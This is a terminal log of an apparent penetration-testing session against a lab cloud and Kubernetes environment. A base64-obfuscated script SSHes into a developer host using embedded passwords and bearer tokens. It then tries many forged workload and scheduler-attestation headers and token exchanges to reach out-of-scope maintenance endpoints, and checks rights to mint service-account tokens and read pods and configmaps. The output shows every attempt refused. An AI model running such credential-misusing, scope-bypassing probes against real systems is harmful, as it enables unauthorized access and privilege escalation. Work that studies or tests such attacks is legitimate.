@@ -1,0 +1,207 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r30.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKQ0E9JEhPTUUvLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdApXPWh0dHBzOi8vd29ya2xvYWRzLmtlcGxlcm9wcy50ZXN0ClU9InJvd2FuLml0bzpma19kZXZlbG9wZXJfeVVXVEtTcXJjMTZ5M0s1XzVEZlE3cWFjZnQ5Yi05eG8iCldUPSQoY3VybCAtc1NrIC1tIDEwIC11ICIkVSIgLVggUE9TVCAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQi9hcGkvd29ya3NwYWNlcy9jdXJyZW50L3Rva2VuLWV4Y2hhbmdlIiB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsanNvbjtwcmludChqc29uLmxvYWQoc3lzLnN0ZGluKS5nZXQoImFjY2Vzc190b2tlbiIsIiIpKScpClJDPSJma19tYWludGVuYW5jZV9ydW50aW1lXzNnSVAzajh3NmZoa0JTcXY3SjV4bGxPckRWYTJLemlnIgpXQz0iZmtfY2lfbWFpbnRlbmFuY2VfblU3VjNET25xN2tweUF3cDQ2Y1Y1MG1POGZxdHhIU0oiClUxPSIkQi9hcGkvbWFpbnRlbmFuY2UvRklFTEQtQ1JSLTIwMjYtMDkiCmcoKXsgbj0iJDEiOyBzaGlmdDsgZWNobyAiIyMjIyMgJG4iOyBjdXJsIC1zU2sgLW0gMTAgLS1jYWNlcnQgJENBIC13ICdcblsle2h0dHBfY29kZX1dXG4nICIkQCIgfCBoZWFkIC1jIDE2MDA7IGVjaG87IH0KZWNobyAiIyMjIyMjIyMjIyBXQyArIHdvcmtsb2FkIGhlYWRlcnMiCmcgIldDICsgV0xJZCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiIC1IICJYLVdvcmtsb2FkLUlkOiBNQUlOVC1GTEstMDEiICIkVTEiCmcgIldDICsgV0xDbGFzcyIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiIC1IICJYLVdvcmtsb2FkLUNsYXNzOiBtYWludGVuYW5jZSIgIiRVMSIKZyAiV0MgKyBXTENsYXNzK1dMSWQiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAtSCAiWC1Xb3JrbG9hZC1DbGFzczogbWFpbnRlbmFuY2UiIC1IICJYLVdvcmtsb2FkLUlkOiBNQUlOVC1GTEstMDEiICIkVTEiCmcgIldDICsgWC1Xb3JrbG9hZCBNQUlOVC1GTEstMDEiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAtSCAiWC1Xb3JrbG9hZDogTUFJTlQtRkxLLTAxIiAiJFUxIgpnICJXQyArIFdMQ2xhc3MrV0xJZCtTY2hlZCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiIC1IICJYLVdvcmtsb2FkLUNsYXNzOiBtYWludGVuYW5jZSIgLUggIlgtV29ya2xvYWQtSWQ6IE1BSU5ULUZMSy0wMSIgLUggIlgtU2NoZWR1bGVyOiBmaWVsZGtlc3Qtc2NoZWR1bGVyIiAiJFUxIgpnICJXQyArIFNjaGVkQXR0ZXN0YXRpb24gV0MiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAtSCAiWC1TY2hlZHVsZXItQXR0ZXN0YXRpb246ICRXQyIgIiRVMSIKZyAiV0MgKyBXTENsYXNzICsgU2NoZWRBdHRlc3RhdGlvbiBXQyIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiIC1IICJYLVdvcmtsb2FkLUNsYXNzOiBtYWludGVuYW5jZSIgLUggIlgtU2NoZWR1bGVyLUF0dGVzdGF0aW9uOiAkV0MiICIkVTEiCmcgIldDICsgcXVlcnkgd29ya2xvYWRfaWQiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAiJFUxP3dvcmtsb2FkX2lkPU1BSU5ULUZMSy0wMSIKZyAiV0MgKyBxdWVyeSB3b3JrbG9hZF9jbGFzcyIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiICIkVTE/d29ya2xvYWRfY2xhc3M9bWFpbnRlbmFuY2UiCmcgIldDICsgcXVlcnkgc2NvcGU9bWFpbnRlbmFuY2UiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdDIiAiJFUxP3Njb3BlPW1haW50ZW5hbmNlIgpnICJXQyBhcmNoaXZlIHBhdGggTUFJTlQtRkxLLTAxL0ZJRUxEIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgIiRCL2FwaS9tYWludGVuYW5jZS9NQUlOVC1GTEstMDEvRklFTEQtQ1JSLTIwMjYtMDkiCmcgIldDIHdvcmtsb2FkIGFyY2hpdmUgcGF0aCIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV0MiICIkQi9hcGkvd29ya2xvYWRzL01BSU5ULUZMSy0wMS9tYWludGVuYW5jZS9GSUVMRC1DUlItMjAyNi0wOSIKZyAiV0MgL2FwaS93b3JrbG9hZHMvTUFJTlQtRkxLLTAxIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgIiRCL2FwaS93b3JrbG9hZHMvTUFJTlQtRkxLLTAxIgplY2hvICIjIyMjIyMjIyMjIHdvcmtsb2FkcyBob3N0Igpmb3IgcCBpbiAiIiAiYXBpL21haW50ZW5hbmNlL0ZJRUxELUNSUi0yMDI2LTA5IiAiYXBpL3dvcmtsb2Fkcy9NQUlOVC1GTEstMDEiICJhcGkvYXR0ZXN0YXRpb25zIiAiYXBpL3NjaGVkdWxlci9hdHRlc3QiICJhcGkvc2NoZWR1bGVyL2F0dGVzdGF0aW9uIiAiYXBpL21haW50ZW5hbmNlL2F0dGVzdCI7IGRvCiBnICJXTEhPU1QgLyRwIFdDIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgIiRXLyRwIgogZyAiV0xIT1NUIC8kcCBFSiIgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV1QiICIkVy8kcCIKZG9uZQplY2hvICIjIyMjIyMjIyMjIGlkZW50aXR5IC8gYXR0ZXN0IGVuZHBvaW50cyBvbiBjbG91ZC1hcGkiCmZvciBwIGluICJhcGkvYXR0ZXN0YXRpb25zIiAiYXBpL2F0dGVzdCIgImFwaS9zY2hlZHVsZXIvYXR0ZXN0IiAiYXBpL3NjaGVkdWxlci9hdHRlc3RhdGlvbiIgImFwaS93b3JrbG9hZHMiICJhcGkvd29ya2xvYWRzL01BSU5ULUZMSy0wMSIgImFwaS9tYWludGVuYW5jZS9hdHRlc3QiICJhcGkvZWFybmVkLWlkZW50aXRpZXMiICJhcGkvaWRlbnRpdGllcy9lYXJuZWQiOyBkbwogZyAiR0VUICRwIFdDIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRXQyIgIiRCLyRwIgpkb25lCmVjaG8gIiMjIyMjIyMjIyMgazhzIFNTQVIgZXhwb3J0OiBzZXJ2aWNlYWNjb3VudHMvdG9rZW4sIHBvZHMsIGpvYnMvbG9ncyIKSz1odHRwczovL2Nsb3VkLWFwaS5rZXBsZXJvcHMudGVzdDo2NDQzCkVKPSQoY3VybCAtc1NrIC1tIDEwIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkV1QiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgIiRCL2FwaS90b2tlbi1leGNoYW5nZS9maWVsZGtlc3QtZXhwb3J0LWFjY2VzcyIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQpmb3IgUiBpbiAiY3JlYXRlfHNlcnZpY2VhY2NvdW50cy90b2tlbnwiICJnZXR8cG9kc3wiICJsaXN0fHBvZHN8IiAiZ2V0fHBvZHMvbG9nfCIgImdldHxzZXJ2aWNlYWNjb3VudHN8IiAiZ2V0fGNvbmZpZ21hcHN8IjsgZG8KIElGUz0nfCcgcmVhZCAtciBWIFIgRyA8PEVPRgokUgpFT0YKIGlmIFsgLXogIiRHIiBdOyB0aGVuIEdBPSciZ3JvdXAiOiIiJzsgZWxzZSBHQT0iXCJncm91cFwiOlwiJEdcIiI7IGZpCiBlY2hvICItLSAkViAkUiIKIGN1cmwgLXNTayAtbSA4IC0tY2FjZXJ0ICRDQSAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLVggUE9TVCBcCiAgLWQgIntcImFwaVZlcnNpb25cIjpcImF1dGhvcml6YXRpb24uazhzLmlvL3YxXCIsXCJraW5kXCI6XCJTZWxmU3ViamVjdEFjY2Vzc1Jldmlld1wiLFwic3BlY1wiOntcInJlc291cmNlQXR0cmlidXRlc1wiOntcIm5hbWVzcGFjZVwiOlwiZmllbGRsaW5rXCIsXCJ2ZXJiXCI6XCIkVlwiLFwicmVzb3VyY2VcIjpcIiRSXCIsJEdBfX19IiBcCiAgIiRLL2FwaXMvYXV0aG9yaXphdGlvbi5rOHMuaW8vdjEvc2VsZnN1YmplY3RhY2Nlc3NyZXZpZXdzIiB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsanNvbgp0cnk6IHByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pWyJzdGF0dXMiXS5nZXQoImFsbG93ZWQiKSkKZXhjZXB0IEV4Y2VwdGlvbjogcHJpbnQoIkVSUiIpJwpkb25lCmVjaG8gRE9ORV9SMzAKUlNICmVjaG8gRklOSVNIRUQK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r30.sh; bash /tmp/k14_r30.sh; echo DONEMARK_1795208498212$((6*7))
+########## WC + workload headers
+##### WC + WLId
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + WLClass
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + WLClass+WLId
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + X-Workload MAINT-FLK-01
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + WLClass+WLId+Sched
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + SchedAttestation WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + WLClass + SchedAttestation WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + query workload_id
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + query workload_class
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC + query scope=maintenance
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC archive path MAINT-FLK-01/FIELD
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WC workload archive path
+{"error":"authentication_required"}
+
+[401]
+
+##### WC /api/workloads/MAINT-FLK-01
+{"error":"authentication_required"}
+
+[401]
+
+########## workloads host
+##### WLHOST / WC
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST / EJ
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/maintenance/FIELD-CRR-2026-09 WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WLHOST /api/maintenance/FIELD-CRR-2026-09 EJ
+{"error":"maintenance_worker_required"}
+
+[401]
+
+##### WLHOST /api/workloads/MAINT-FLK-01 WC
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/workloads/MAINT-FLK-01 EJ
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/attestations WC
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/attestations EJ
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/scheduler/attest WC
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/scheduler/attest EJ
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/scheduler/attestation WC
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/scheduler/attestation EJ
+{"error":"authentication_required"}
+
+[401]
+
+##### WLHOST /api/maintenance/attest WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### WLHOST /api/maintenance/attest EJ
+{"error":"maintenance_worker_required"}
+
+[401]
+
+########## identity / attest endpoints on cloud-api
+##### GET api/attestations WC
+{"error":"authentication_required"}
+
+[401]
+
+##### GET api/attest WC
+{"error":"authentication_required"}
+
+[401]
+
+##### GET api/scheduler/attest WC
+{"error":"authentication_required"}
+
+[401]
+
+##### GET api/scheduler/attestation WC
+{"error":"authentication_required"}
+
+[401]
+
+##### GET api/workloads WC
+{"error":"authentication_required"}
+
+[401]
+
+##### GET api/workloads/MAINT-FLK-01 WC
+{"error":"authentication_required"}
+
+[401]
+
+##### GET api/maintenance/attest WC
+{"error":"out_of_scope_workload"}
+
+[403]
+
+##### GET api/earned-identities WC
+{"error":"authentication_required"}
+
+[401]
+
+##### GET api/identities/earned WC
+{"error":"authentication_required"}
+
+[401]
+
+########## k8s SSAR export: serviceaccounts/token, pods, jobs/logs
+-- create serviceaccounts/token
+False
+-- get pods
+False
+-- list pods
+False
+-- get pods/log
+False
+-- get serviceaccounts
+False
+-- get configmaps
+False
+DONE_R30
+FINISHED
